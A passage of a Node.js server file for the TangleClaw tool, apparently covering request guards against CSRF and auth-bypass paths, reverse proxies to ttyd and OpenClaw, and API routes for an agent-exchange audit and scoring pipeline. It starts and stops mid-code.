  const looksLikeBrowser = req.headers['sec-fetch-site'] !== undefined
    || req.headers.origin !== undefined;
  if (CSRF_UNSAFE_METHODS.has(method) && looksLikeBrowser) {
    // #860 — a browser-shaped write that carries a BODY must declare JSON.
    //
    // This is what makes the form attack a CORS *simple* request in the first
    // place: `parseBody` JSON-parses any body whatever its Content-Type, and
    // the three encodings a `<form>` can send (`text/plain`,
    // `application/x-www-form-urlencoded`, `multipart/form-data`) are exactly
    // the three that need no preflight. Requiring `application/json` forces a
    // preflight the server never answers affirmatively, and a form cannot send
    // that type at all — so the class closes without depending on
    // `Sec-Fetch-Site` being present or being `cross-site`. That is the point:
    // it also covers the `same-site` sibling-subdomain residual the
    // Sec-Fetch-Site guard deliberately allows, without refusing `same-site`
    // outright and breaking legitimate multi-subdomain deployments.
    //
    // Scoped to browser-shaped requests for the same reason the guards below
    // are: `curl`, scripts and the agent-facing API send no `Sec-Fetch-Site`
    // and no `Origin`, so they are unaffected whatever Content-Type they use.
    // That is what lets this land without breaking the documented agent API —
    // the guide's PortHub and shared-docs examples show a JSON body and no
    // header, and they keep working exactly as written.
    //
    // Keyed on a body being PRESENT, not on the method. The dashboard sends
    // genuine bodyless writes (`medusa/toggle`, `medusa/read`,
    // `wrap-sentinel/ack` go through `api()` with no body and no
    // Content-Type), and refusing those would break the operator's own UI to
    // close nothing — a request with no body carries no forged payload. The
    // residual is a bodyless same-site POST to a route that acts without one;
    // `Sec-Fetch-Site` still refuses the cross-site case, which is the one an
    // arbitrary page can mount.
    // Confined to TangleClaw's OWN API. This block runs ahead of route
    // matching, so without the check it would also govern `/terminal/*`,
    // `/openclaw/*` and `/openclaw-direct/*` — reverse proxies whose browser
    // client is NOT ours: `public/openclaw-view.js` iframes
    // `/openclaw-direct/:connId/chat` SAME-ORIGIN, so OpenClaw's gateway UI
    // runs inside our page and its fetches are browser-shaped. Any of them
    // using the ordinary `fetch(url, {method:'POST', body: JSON.stringify(x)})`
    // idiom — no explicit header, which the browser labels
    // `text/plain;charset=UTF-8` — would take a 415 before reaching the
    // gateway, and multipart attachment paths would break the same way.
    // Imposing a media-type contract on a third party's client through a proxy
    // is not ours to do, and grepping `public/` cannot see it.
    //
    // Those prefixes keep the two guards below (cross-site refusal, and the
    // served-Host check), which is exactly what they had before this change —
    // so this is no regression, only a narrower new rule. The residual is a
    // same-site body-carrying write to a proxied path, recorded in
    // `security-model.md` beside the others.
    const ownApiSurface = pathname.startsWith('/api/');
    const hasBody = Number(req.headers['content-length'] || 0) > 0
      || req.headers['transfer-encoding'] !== undefined;
    const declaredType = String(req.headers['content-type'] || '')
      .split(';')[0].trim().toLowerCase();
    if (ownApiSurface && hasBody && declaredType !== 'application/json') {
      log.warn('Refused browser write whose body is not declared JSON', {
        method, path: pathname, contentType: declaredType || '(none)'
      });
      return errorResponse(res, 415,
        'A request body from a browser must be declared as application/json.',
        'JSON_BODY_REQUIRED');
    }

    // ONE read of config, shared by both checks below. They used to load it
    // separately and only one wrapped the call, so a corrupt config threw out
    // of the request through the unguarded path instead of being refused.
    // `null` here means "could not read it", which fails CLOSED: no exemption,
    // and an empty name list (an IP-literal Host still passes on its own merit).
    const cfg = _loadConfigOrNull();
    const allowlist = cfg ? _servedHostsOrEmpty(cfg) : new Set();
    if (!_setupRouteNeedingHostExemption(pathname, cfg)
        && !_hostIsAllowed(req.headers.host, allowlist)) {
      log.warn('Refused state-changing request for an unserved Host', {
        method, path: pathname, host: req.headers.host
      });
      return errorResponse(res, 403,
        'This server does not answer to that host name.', 'HOST_NOT_SERVED');
    }
  }

  // API routes
  if (pathname.startsWith('/api/')) {

    const matched = matchRoute(method, pathname);
    if (!matched) {
      log.debug('Route not found', { method, path: pathname });
      return errorResponse(res, 404, `${method} ${pathname} not found`, 'NOT_FOUND');
    }

    // AUTH-4 — M2M service-token gate on the PortHub + shared-docs surfaces. A
    // no-op when serviceTokenEnabled is false (default), so the surfaces stay
    // byte-for-byte open until the operator opts in.
    if (serviceToken.requiresServiceToken(pathname)) {
      const gate = serviceToken.validateRequest(req.headers, store.config.load());
      if (!gate.ok) {
        // Log the denial (never the token) — the gate returns before the normal
        // access-log line below, so without this a rejected M2M caller leaves no
        // trace for the operator to debug.
        log.warn('Service-token gate denied request', { method, path: pathname, code: gate.code });
        return errorResponse(res, gate.status, gate.message, gate.code);
      }
    }

    try {
      const body = await parseBody(req, matched.options.maxBodySize);
      await matched.handler(req, res, matched.params, body);
    } catch (err) {
      if (err.status) {
        return errorResponse(res, err.status, err.message, err.code);
      }
      log.error('Unhandled error in route handler', {
        method, path: pathname, error: err.message, stack: err.stack
      });
      return errorResponse(res, 500, 'Internal server error', 'INTERNAL_ERROR');
    }

    const duration = Date.now() - startTime;
    log.info(`${method} ${pathname}`, { status: res.statusCode, duration: `${duration}ms` });
    return;
  }

  // Terminal reverse proxy — forward /terminal/* to ttyd
  if (pathname.startsWith('/terminal/') || pathname === '/terminal') {
    if (method === 'GET' || method === 'POST') {
      return proxyToTtyd(req, res, pathname);
    }
  }

  // OpenClaw direct proxy — forward /openclaw-direct/:connId/* to local tunnel port (standalone)
  if (pathname.startsWith('/openclaw-direct/')) {
    const parts = pathname.split('/'); // ['', 'openclaw-direct', connId, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const connId = decodeURIComponent(parts[2]);
      const resolved = resolveOpenclawPortDirect(connId);
      if (!resolved) {
        return errorResponse(res, 404, 'OpenClaw connection not found', 'NOT_FOUND');
      }
      const subPath = parts.slice(3).join('/');
      const targetPath = '/' + subPath + (req.url.includes('?') ? '?' + req.url.split('?')[1] : '');

      const proxyReq = http.request({
        hostname: '127.0.0.1',
        port: resolved.localPort,
        path: targetPath,
        method: req.method,
        headers: _openclawProxyHeaders(req.headers, resolved.localPort, resolved.conn.gatewayToken)
      }, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, _stripFrameBlockers(proxyRes.headers));
        proxyRes.pipe(res);
      });

      proxyReq.on('error', (err) => {
        log.warn('OpenClaw direct proxy error', { error: err.message, connId });
        errorResponse(res, 502, 'OpenClaw service unavailable', 'BAD_GATEWAY');
      });

      req.pipe(proxyReq);
      return;
    }
  }

  // OpenClaw reverse proxy — forward /openclaw/:project/* to local tunnel port
  if (pathname.startsWith('/openclaw/')) {
    const parts = pathname.split('/'); // ['', 'openclaw', project, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const ocProject = decodeURIComponent(parts[2]);
      const subPath = parts.slice(3).join('/');
      return proxyToOpenclaw(req, res, ocProject, subPath);
    }
  }

  // Static files
  if (method === 'GET') {
    if (serveStatic(res, pathname)) {
      const duration = Date.now() - startTime;
      log.debug(`${method} ${pathname}`, { status: 200, duration: `${duration}ms` });
      return;
    }
  }

  // Fail-closed auth-bypass parity guard (#473). Caddy's basic_auth gate decides
  // "bypass" against the DECODED, path-cleaned target, while TC's router above
  // parses the RAW target with `new URL` — so normalization variants
  // (`/openclaw-direct//x`, `//openclaw-direct/x`, `/openclaw-direct%2Fx`) can be
  // waved through unauthenticated by Caddy yet miss the OpenClaw proxy route here.
  // A real bypass path is already handled above (health via /api, the OpenClaw
  // proxy, the manifest file via serveStatic). Anything reaching this point whose
  // Caddy-canonical path is still a bypass path did NOT resolve to its handler, so
  // serving the SPA shell would leak it unauthenticated (the #472 residual-risk #2
  // leak class). Refuse instead — never serve fallback content to a bypass-shaped
  // request. Non-bypass GETs fall through to the SPA/wrapper routes unchanged.
  if (caddy.isCaddyAuthBypassPath(req.url)) {
    log.warn('Auth-bypass path fell through without a handler — refusing (parity guard)', {
      method, path: pathname, canonical: caddy.caddyCanonicalPath(req.url)
    });
    return errorResponse(res, 404, 'Not found', 'NOT_FOUND');
  }

  // Session wrapper page — /session/:name serves session.html
  if (method === 'GET' && pathname.startsWith('/session/') && pathname.split('/').length === 3) {
    const sessionName = pathname.split('/')[2];
    if (sessionName && serveStatic(res, '/session.html')) {
      return;
    }
  }

  // OpenClaw viewer page — /openclaw-view/:connId serves openclaw-view.html
  if (method === 'GET' && pathname.startsWith('/openclaw-view/') && pathname.split('/').length === 3) {
    const connId = pathname.split('/')[2];
    if (connId && serveStatic(res, '/openclaw-view.html')) {
      return;
    }
  }

  // Fallback: serve index.html for SPA routing
  if (method === 'GET' && !pathname.includes('.')) {
    if (serveStatic(res, '/')) {
      return;
    }
  }

  errorResponse(res, 404, 'Not found', 'NOT_FOUND');
}

// ── Eval Audit Mode ──

// Debounced incident generation — max once per 60s per project
const _incidentGenerationTimestamps = {};

/**
 * Run incident generation for a project if not run in the last 60 seconds.
 * @param {string} project - Project name
 */
function _maybeGenerateIncidents(project) {
  const now = Date.now();
  const lastRun = _incidentGenerationTimestamps[project] || 0;
  if (now - lastRun < 60000) return;
  _incidentGenerationTimestamps[project] = now;
  try {
    evalAudit.generateIncidents(project, store);
  } catch (err) {
    log.error('Incident generation failed', { project, error: err.message });
  }
}

// POST /api/audit/ingest — Receive exchange data from OpenClaw webhook
route('POST', '/api/audit/ingest', (_req, res, _params, body) => {
  // Authenticate via Bearer token
  const authHeader = _req.headers['authorization'] || '';
  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null;

  if (!token) {
    return errorResponse(res, 401, 'Missing Authorization header', 'UNAUTHORIZED');
  }

  // Find the connection by matching audit_secret
  const connections = store.openclawConnections.list();
  const conn = connections.find(c => c.auditSecret && c.auditSecret === token);
  if (!conn) {
    return errorResponse(res, 401, 'Invalid audit token', 'UNAUTHORIZED');
  }

  // Validate payload
  const validation = evalAudit.validateIngestPayload(body);
  if (!validation.valid) {
    return errorResponse(res, 400, validation.error, 'BAD_REQUEST');
  }

  // Resolve project from connection (find projects using this connection as engine)
  const projects = store.projects.list();
  const project = projects.find(p => p.engineId === `openclaw:${conn.id}`);
  const projectName = project ? project.name : (body.project || 'unknown');

  // Transform and store the exchange
  const exchangeData = evalAudit.transformIngestPayload(body, projectName);
  const exchange = store.evalExchanges.insert(exchangeData);

  // Record heartbeat for watchdog
  evalAudit.heartbeat(body.session_id);

  const evalDims = evalAudit.getEvalDimensions();

  // Determine if this exchange should be scored (sampling)
  const projectConfig = project
    ? store.projectConfig.load(project.path)
    : store.DEFAULT_PROJECT_CONFIG;
  const auditConfig = projectConfig.evalAuditMode || {};
  const samplingConfig = auditConfig.sampling || {};

  // Run Tier 1 (always — it's free)
  const tier1Result = evalAudit.runTier1(
    { userMessage: exchange.userMessage, agentResponse: exchange.agentResponse, agentThinking: exchange.agentThinking },
    evalDims.tier1 || []
  );

  // Decide if we should score beyond Tier 1
  const samplingDecision = evalAudit.shouldScore(
    exchange,
    samplingConfig,
    { tier1Flags: tier1Result.flags }
  );

  // Cost cap enforcement — skip paid tiers if session cost exceeds cap
  const costCap = auditConfig.costCapPerSession || 1.00;
  const sessionCost = store.evalScores.getSessionCost(body.session_id);
  const costCapResult = evalAudit.checkCostCap(sessionCost, costCap);

  if (costCapResult.exceeded && samplingDecision.shouldScore) {
    // Store Tier 1 only (free), mark as cost-cap-skipped
    store.evalExchanges.updateScored(exchange.id, 3);

    if (tier1Result.flags.length > 0) {
      store.evalScores.insert({
        exchangeId: exchange.id,
        schemaVersion: evalDims.schemaVersion || 'default-v1',
        judgeModel: 'structural',
        scoredAt: new Date().toISOString(),
        tier1StructuralScore: tier1Result.score,
        tier1Flags: tier1Result.flags,
        tier2Skipped: true,
        tier2_5Skipped: true,
        tier3Skipped: true,
        anomalyFlag: true,
        anomalyReason: `Structural: ${tier1Result.flags.join(', ')}`,
        costUsd: 0
      });
    }

    return jsonResponse(res, 201, {
      exchangeId: exchange.id,
      scored: false,
      reason: 'cost_cap_exceeded',
      tier1: tier1Result,
      costCap: { currentCost: costCapResult.currentCost, cap: costCapResult.cap }
    });
  }

  if (!samplingDecision.shouldScore) {
    // Mark as skipped (sampling) but still store Tier 1 result
    store.evalExchanges.updateScored(exchange.id, 2);

    // Store Tier 1-only score if there were flags
    if (tier1Result.flags.length > 0) {
      store.evalScores.insert({
        exchangeId: exchange.id,
        schemaVersion: evalDims.schemaVersion || 'default-v1',
        judgeModel: 'structural',
        scoredAt: new Date().toISOString(),
        tier1StructuralScore: tier1Result.score,
        tier1Flags: tier1Result.flags,
        tier2Skipped: true,
        tier2_5Skipped: true,
        tier3Skipped: true,
        anomalyFlag: tier1Result.flags.length > 0,
        anomalyReason: tier1Result.flags.length > 0 ? `Structural: ${tier1Result.flags.join(', ')}` : null,
        costUsd: 0
      });
      store.evalExchanges.updateScored(exchange.id, 1);
    }

    return jsonResponse(res, 201, {
      exchangeId: exchange.id,
      scored: false,
      reason: samplingDecision.reason,
      tier1: tier1Result
    });
  }

  // Insert initial Tier 1 score record
  const scoreRecord = store.evalScores.insert({
    exchangeId: exchange.id,
    schemaVersion: evalDims.schemaVersion || 'default-v1',
    judgeModel: auditConfig.judgeModel || 'claude-haiku-4-5-20251001',
    scoredAt: new Date().toISOString(),
    tier1StructuralScore: tier1Result.score,
    tier1Flags: tier1Result.flags,
    tier2Skipped: true,
    tier2_5Skipped: true,
    tier3Skipped: true,
    anomalyFlag: tier1Result.flags.length > 0,
    anomalyReason: tier1Result.flags.length > 0 ? `Structural: ${tier1Result.flags.join(', ')}` : null,
    costUsd: 0
  });

  store.evalExchanges.updateScored(exchange.id, 1);

  // Send immediate response with Tier 1 results (non-blocking)
  jsonResponse(res, 201, {
    exchangeId: exchange.id,
    scoreId: scoreRecord.id,
    scored: true,
    reason: samplingDecision.reason,
    tier1: tier1Result,
    anomaly: tier1Result.flags.length > 0
  });

  // Run Tier 2/2.5/3 pipeline asynchronously (does not block the response)
  evalAudit.runScoringPipeline({
    exchange: { userMessage: exchange.userMessage, agentResponse: exchange.agentResponse, agentThinking: exchange.agentThinking, turnNumber: exchange.turnNumber },
    tier1Result,
    evalDims,
    samplingReason: samplingDecision.reason,
    options: {
      callJudge: auditConfig._callJudge || undefined,
      model: auditConfig.judgeModel,
      apiKey: auditConfig.apiKey,
      gateCascade: auditConfig.gateCascade !== false
    }
  }).then(pipelineResult => {
    // Update the score record with Tier 2/2.5/3 results
    const updateData = { costUsd: pipelineResult.totalCost };

    if (pipelineResult.tier2) {
      updateData.tier2SemanticScore = pipelineResult.tier2.score;
      updateData.tier2Reasoning = pipelineResult.tier2.reasoning;
      updateData.tier2Skipped = false;
      updateData.judgeModel = auditConfig.judgeModel || 'claude-haiku-4-5-20251001';
    }

    if (pipelineResult.tier2_5) {
      updateData.tier2_5AlignmentScore = pipelineResult.tier2_5.alignmentScore;
      updateData.tier2_5Reasoning = pipelineResult.tier2_5.reasoning;
      updateData.tier2_5Skipped = false;
    } else {
      updateData.tier2_5Skipped = true;
    }

    if (pipelineResult.tier3) {
      updateData.tier3BehavioralScore = pipelineResult.tier3.score;
      updateData.tier3DimensionScores = pipelineResult.tier3.dimensionScores;
      updateData.tier3Skipped = false;
    } else {
      updateData.tier3Skipped = true;
    }

    // Re-check anomaly with full scoring data
    const fullAnomaly = evalAudit.checkPerExchangeAnomaly({
      tier1Flags: tier1Result.flags,
      tier3DimensionScores: pipelineResult.tier3 ? pipelineResult.tier3.dimensionScores : null,
      tier2_5AlignmentScore: pipelineResult.tier2_5 ? pipelineResult.tier2_5.alignmentScore : null
    });
    updateData.anomalyFlag = fullAnomaly.anomaly;
    updateData.anomalyReason = fullAnomaly.anomaly ? fullAnomaly.reasons.join('; ') : null;

    store.evalScores.update(scoreRecord.id, updateData);

    // Debounced incident generation (max once per minute per project)
    _maybeGenerateIncidents(projectName);
  }).catch(err => {
    log.error('Async scoring pipeline failed', { exchangeId: exchange.id, error: err.message });
  });
}, { maxBodySize: 512 * 1024 });

// ── Sidecar: OpenClaw Process Visibility ──

// GET /api/sidecar/:project/processes — Get cached process state for an OpenClaw project
route('GET', '/api/sidecar/:project/processes', (_req, res, params) => {
  const projectName = params.project;
  const state = sidecar.getProcessesForProject(projectName);

  if (!state.connectionId) {
    return errorResponse(res, 404, `Project "${projectName}" is not an OpenClaw project`, 'NOT_FOUND');
  }

  // Ensure polling is running for this connection
  if (!sidecar._pollers.has(state.connectionId)) {
    sidecar.startPolling(state.connectionId);
  }

  jsonResponse(res, 200, {
    active: state.processes ? (state.processes.active || []) : [],
    recent: state.processes ? (state.processes.recent || []) : [],
    lastPollAt: state.lastPollAt,
    stale: state.stale,
    error: state.error
  });
});

// GET /api/sidecar/connection/:connId/processes — Get cached process state by connection ID (direct connect)
route('GET', '/api/sidecar/connection/:connId/processes', (_req, res, params) => {
  const connId = params.connId;
  const state = sidecar.getProcessesByConnection(connId);

  if (state.error === 'Connection not found') {
    return errorResponse(res, 404, `Connection "${connId}" not found`, 'NOT_FOUND');
  }

  // Ensure polling is running for this connection
  if (!sidecar._pollers.has(connId)) {
    sidecar.startPolling(connId);
  }

  jsonResponse(res, 200, {
    active: state.active,
    recent: state.recent,
    lastPollAt: state.lastPollAt,
    stale: state.stale,
    error: state.error
  });
});

// POST /api/audit/heartbeat — Lightweight heartbeat from OpenClaw
route('POST', '/api/audit/heartbeat', (_req, res, _params, body) => {
  if (!body || !body.session_id) {
    return errorResponse(res, 400, 'Missing session_id', 'BAD_REQUEST');
  }
  evalAudit.heartbeat(body.session_id);
  return jsonResponse(res, 200, { ok: true });
});

// GET /api/audit/telemetry — Heartbeat status for all active sessions
route('GET', '/api/audit/telemetry', (_req, res) => {
  const statuses = evalAudit.getTelemetryStatus();
  return jsonResponse(res, 200, { sessions: statuses });
});

// GET /api/audit/:project/scores — Query scores for a project
route('GET', '/api/audit/:project/scores', (req, res, params) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  try {
    const scores = store.evalScores.listByProject(params.project, {
      from: query.from || null,
      to: query.to || null,
      anomaliesOnly: query.anomalies === 'true',
      limit: query.limit ? parseInt(query.limit, 10) : 100
    });
    return jsonResponse(res, 200, { scores, count: scores.length });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/anomalies — Anomaly log for a project
route('GET', '/api/audit/:project/anomalies', (req, res, params) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  try {
    const anomalies = store.evalScores.listByProject(params.project, {
      from: query.from || null,
      to: query.to || null,
      anomaliesOnly: true,
      limit: query.limit ? parseInt(query.limit, 10) : 100
    });
    return jsonResponse(res, 200, { anomalies, count: anomalies.length });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/summary — Current period summary
route('GET', '/api/audit/:project/summary', (_req, res, params) => {
  try {
    const project = params.project;
    const exchanges = store.evalExchanges.list({ project });
    const scored = exchanges.filter(e => e.scored === 1).length;
    const pending = exchanges.filter(e => e.scored === 0).length;
    const skippedSampling = exchanges.filter(e => e.scored === 2).length;
    const skippedCostCap = exchanges.filter(e => e.scored === 3).length;

    const scores = store.evalScores.listByProject(project);
    const anomalyCount = scores.filter(s => s.anomalyFlag).length;

    // Compute average Tier 1 score
    const tier1Scores = scores
      .filter(s => s.tier1StructuralScore !== null && s.tier1StructuralScore !== undefined)
      .map(s => s.tier1StructuralScore);
    const avgTier1 = tier1Scores.length > 0
      ? tier1Scores.reduce((a, b) => a + b, 0) / tier1Scores.length
      : null;

    const baseline = store.evalBaselines.getLatest(project);

    return jsonResponse(res, 200, {
      project,
      exchanges: {
        total: exchanges.length,
        scored,
        pending,
        skippedSampling,
        skippedCostCap
      },
      scores: {
        total: scores.length,
        anomalies: anomalyCount,
        avgTier1Structural: avgTier1 !== null ? Math.round(avgTier1 * 1000) / 1000 : null
      },
      baseline: baseline ? {
        computedAt: baseline.computedAt,
        exchangeCount: baseline.exchangeCount,
        schemaVersion: baseline.schemaVersion
      } : null
    });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/baseline — Current baseline
route('GET', '/api/audit/:project/baseline', (_req, res, params) => {
  try {
    const baseline = store.evalBaselines.getLatest(params.project);
    if (!baseline) {
      return jsonResponse(res, 200, { baseline: null, message: 'No baseline computed yet' });
    }
    return jsonResponse(res, 200, { baseline });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/trends — Aggregated score trends over time
route('GET', '/api/audit/:project/trends', (req, res, params) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  try {
    const window = query.window || '14d';
    const scores = store.evalScores.listByProject(params.project, { limit: 10000 });
    const trends = evalAudit.aggregateTrends(scores, window);
    return jsonResponse(res, 200, { project: params.project, ...trends });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/wrap-quality — Wrap quality scores for recent sessions
route('GET', '/api/audit/:project/wrap-quality', (req, res, params) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  try {
    const limit = query.limit ? parseInt(query.limit, 10) : 10;
    const sessions = store.evalExchanges.listSessions(params.project, { limit });

    // Score against the steps this project's wrap actually runs — the
    // code-owned pipeline minus override-disabled steps — so a commit-only
    // project isn't marked down for steps it deliberately turned off.
    const projects = store.projects.list();
    const project = projects.find(p => p.name === params.project);
    let wrapStepIds = [];
    let expectedStepsUnavailable = false;
    if (project && project.path) {
      // Raw read rather than store.projectConfig.load: load() masks a corrupt
      // file by returning defaults, which would silently score the project
      // against the full pipeline as if its overrides never existed. An audit
      // surface must report the degraded state, not paper over it.
      const cfgPath = path.join(project.path, '.tangleclaw', 'project.json');
      try {
        const overrides = fs.existsSync(cfgPath)
          ? JSON.parse(fs.readFileSync(cfgPath, 'utf8')).wrapStepOverrides
          : null;
        wrapStepIds = wrapDefaultPipeline.effectiveStepIds(overrides);
      } catch (err) { // prawduct:allow prawduct/broad-except -- an unreadable project config must not 500 the audit surface; the degraded state is logged and flagged in the response
        // Empty expected steps scores every session 1.0 — indistinguishable
        // from a deliberately commit-only project unless flagged.
        log.warn('project config unreadable — wrap-quality scored with no expected steps', {
          project: params.project,
          error: err.message
        });
        expectedStepsUnavailable = true;
      }
    }

    const results = sessions.map(sess => {
      // Get last 5 exchanges for this session
      const exchanges = store.evalExchanges.list({
        project: params.project,
        sessionId: sess.sessionId
      }).slice(-5);

      const quality = evalAudit.scoreWrapQuality(exchanges, wrapStepIds);
      return {
        sessionId: sess.sessionId,
        exchangeCount: sess.exchangeCount,
        lastTimestamp: sess.lastTimestamp,
        ...quality
      };
    });

    return jsonResponse(res, 200, { project: params.project, sessions: results, expectedStepsUnavailable });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// POST /api/audit/:project/baseline/recompute — Recompute baseline from recent scores
route('POST', '/api/audit/:project/baseline/recompute', (req, res, params, body) => {
  try {
    const window = (body && body.window) || '14d';
    const baseline = evalAudit.computeBaseline(params.project, store, { window });
    if (!baseline) {
      return jsonResponse(res, 200, { baseline: null, message: 'No scores found in window to compute baseline' });
    }
    return jsonResponse(res, 200, { baseline });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/incidents — List incidents
route('GET', '/api/audit/:project/incidents', (req, res, params) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  try {
    const options = {};
    if (query.status) options.status = query.status;
    if (query.type) options.type = query.type;
    if (query.limit) options.limit = parseInt(query.limit, 10);
    const incidents = store.evalIncidents.list(params.project, options);
    return jsonResponse(res, 200, { project: params.project, incidents });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/incidents/:id — Get single incident
route('GET', '/api/audit/:project/incidents/:id', (_req, res, params) => {
  try {
    const incident = store.evalIncidents.get(params.id);
    if (!incident || incident.project !== params.project) {
      return errorResponse(res, 404, 'Incident not found', 'NOT_FOUND');
    }
    return jsonResponse(res, 200, { incident });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// PUT /api/audit/:project/incidents/:id — Update incident (accept/dismiss)
route('PUT', '/api/audit/:project/incidents/:id', (_req, res, params, body) => {
  try {
    const existing = store.evalIncidents.get(params.id);
    if (!existing || existing.project !== params.project) {
      return errorResponse(res, 404, 'Incident not found', 'NOT_FOUND');
    }
    if (!body || !body.status) {
      return errorResponse(res, 400, 'Missing status field', 'VALIDATION');
    }
    const validStatuses = ['open', 'accepted', 'dismissed'];
    if (!validStatuses.includes(body.status)) {
      return errorResponse(res, 400, `Invalid status: ${body.status}. Must be one of: ${validStatuses.join(', ')}`, 'VALIDATION');
    }
    const updateData = { status: body.status };
    if (body.status !== 'open') {
      updateData.resolvedAt = new Date().toISOString();
      updateData.resolvedBy = body.resolvedBy || 'user';
    }
    const updated = store.evalIncidents.update(params.id, updateData);
    return jsonResponse(res, 200, { incident: updated });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// POST /api/audit/:project/scores/:id/human — Submit human score for an exchange
route('POST', '/api/audit/:project/scores/:id/human', (_req, res, params, body) => {
  try {
    const score = store.evalScores.get(params.id);
    if (!score) {
      return errorResponse(res, 404, 'Score record not found', 'NOT_FOUND');
    }
    // Verify score belongs to the project
    const exchange = store.evalExchanges.get(score.exchangeId);
    if (!exchange || exchange.project !== params.project) {
      return errorResponse(res, 404, 'Score record not found for this project', 'NOT_FOUND');
    }
    const validation = evalAudit.validateHumanScore(body);
    if (!validation.valid) {
      return errorResponse(res, 400, validation.error, 'VALIDATION');
    }
    const updated = store.evalScores.updateHumanScore(params.id, body);
    return jsonResponse(res, 200, { score: updated });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// POST /api/audit/retention/run — Manually trigger retention policy
route('POST', '/api/audit/retention/run', (_req, res, _params, body) => {
  try {
    const retentionDays = (body && body.retentionDays) || 90;
    const result = evalAudit.runRetentionPolicy(store, retentionDays);
    return jsonResponse(res, 200, result);
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// ── Server Creation ──

/**
 * Report the protocol a constructed server actually speaks.
 *
 * The distinction this exists to preserve: config `httpsEnabled` is *intent*,
 * and `createServer` falls back to plain HTTP whenever HTTPS is asked for
 * without usable cert/key. That is the ordinary fresh-install state, since the
 * shipped default enables HTTPS before any certificate exists — so a startup
 * banner derived from config announced `https://` for a plain-HTTP socket and
 * sent new operators to debug certificates that were never in play. Ask the
 * server, not the config.
 *
 * @param {http.Server|https.Server} server - The constructed server
 * @returns {'https'|'http'} The scheme the server actually serves
 */
function serverProtocol(server) {
  return server instanceof https.Server ? 'https' : 'http';
}

/**
 * Say once, loudly, when `TANGLECLAW_PORT` is set to something unbindable.
 *
 * `httpsSetup.effectiveServerPort` falls back silently by design — it also runs
 * on every config regeneration, so it must not log. That leaves boot responsible
 * for the noise, and boot is where it matters: a silent fallback here would
 * replace the hard `ERR_SOCKET_BAD_PORT` that `server.listen('<typo>')` used to
 * raise with a server quietly listening on a port the plist, `install.sh`'s
 * health check, and any Caddy upstream all disagree with. Same posture as the
 * `httpsFallback` WARN on the listen line (#616): report the fallback, don't
 * hide it.
 *
 * An unset OR empty value is "no override" — not a misconfiguration — so it says
 * nothing. Only a non-empty value the server could never bind is worth an error.
 *
 * Extracted from `main` so the branch is testable (the #616 seam pattern).
 *
 * @param {number} portInUse - The port actually resolved for binding.
 * @param {object} [env] - Environment to read; defaults to `process.env`.
 * @param {object} [logger] - Logger to use; defaults to the module logger.
 * @returns {boolean} Whether a warning was emitted.
 */
function warnUnbindablePortEnv(portInUse, env, logger) {
  const raw = (env || process.env).TANGLECLAW_PORT;
  if (raw === undefined || raw === null || String(raw).trim() === '') return false;
  if (httpsSetup.isBindableServerPort(raw)) return false;
  (logger || log).error(
    'TANGLECLAW_PORT is not a bindable port — ignoring it and using the configured port instead. '
    + 'Fix the value in ~/Library/LaunchAgents/com.tangleclaw.server.plist; until then anything that '
    + 'expects the plist port (health checks, Caddy upstream) will not reach this server.',
    { tangleclawPortEnv: String(raw), portInUse }
  );
  return true;
}

/**
 * Create and configure the HTTP/HTTPS server (does not start listening).
 * @param {object} [options]
 * @param {boolean} [options.httpsEnabled] - Use HTTPS
 * @param {string} [options.certPath] - Path to TLS certificate
 * @param {string} [options.keyPath] - Path to TLS private key
 * @returns {http.Server|https.Server}
 */
function createServer(options = {}) {
  let server;
  if (options.httpsEnabled && options.certPath && options.keyPath) {
    try {
      const cert = fs.readFileSync(options.certPath);
      const key = fs.readFileSync(options.keyPath);
      server = https.createServer({ cert, key }, handleRequest);
      log.info('HTTPS enabled', { cert: options.certPath });
    } catch (err) {
      log.warn('HTTPS enabled but cert/key could not be loaded — falling back to HTTP. Fix cert paths in Settings or regenerate via the setup wizard.', {
        certPath: options.certPath,
        keyPath: options.keyPath,
        error: err.message
      });
      server = http.createServer(handleRequest);
    }
  } else {
    if (options.httpsEnabled && (!options.certPath || !options.keyPath)) {
      log.warn('HTTPS enabled but cert/key paths not configured — falling back to HTTP. Run the setup wizard (Settings → HTTPS) to generate certificates.', {
        certPath: options.certPath || null,
        keyPath: options.keyPath || null
      });
    }
    server = http.createServer(handleRequest);
  }
  server.on('upgrade', handleUpgrade);
  return server;
}

// ── Main ──

if (require.main === module) {
  // Configure log level from env or config
  const envLogLevel = process.env.TANGLECLAW_LOG_LEVEL;
  if (envLogLevel) {
    setLevel(envLogLevel);
  }

  // Capture git HEAD SHA at boot for stale-server detection (#199).
  // Doing this before store.init keeps the snapshot honest — any code
  // paths the store init triggers run against the SHA we just stamped.
  serverInfo.captureStartup();

  // Initialize store (needed for config before PID check)
  store.init();
  const config = store.config.load();

  // PID file guard — prevent duplicate instances
  const existingPid = pidfile.check();
  if (existingPid) {
    // eslint-disable-next-line no-console
